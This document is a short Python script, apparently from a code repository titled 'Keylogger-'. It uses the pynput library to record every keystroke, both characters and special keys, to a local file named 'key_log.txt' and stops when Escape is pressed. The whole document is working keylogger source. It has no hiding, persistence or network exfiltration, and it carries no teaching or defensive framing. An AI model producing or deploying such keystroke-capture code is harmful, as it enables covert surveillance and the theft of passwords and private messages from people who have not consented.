# Keylogger-

from pynput import keyboard 

# Define the log file
log_file = "key_log.txt"

# Function to log keystrokes
def on_press(key):
    try:
        # Write the key pressed to the file
        with open(log_file, "a") as f:
            # If the key is a character, print its value
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., space, enter, shift)
        with open(log_file, "a") as f:
            # Record special keys with their name
            f.write(f" [{key}] ")

# Function to stop the listener
def on_release(key):
    # Stop logging when the Escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Listener setup
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
